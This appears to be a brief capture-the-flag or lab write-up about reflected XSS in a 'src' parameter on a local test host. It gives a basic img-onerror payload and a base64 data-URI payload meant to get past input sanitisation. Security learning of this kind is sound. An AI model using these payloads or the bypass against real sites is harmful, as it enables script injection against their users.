## Reflected xss

http://192.168.56.101/index.php?page=media&src=nsa

src parameter may be vulnerable to reflected xss attack. We can try some basic payload:

http://192.168.56.101/index.php?page=media&src=<img src=x onerror=alert("XSS")>

It doesnt seems to work, the data must be sanatized. To bypass this, we can try to embed the data inside a tag to encode it in base 64.
This way the sanitizer wont be able to detect that our input is malicious.


http://192.168.56.101/?page=media&src=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=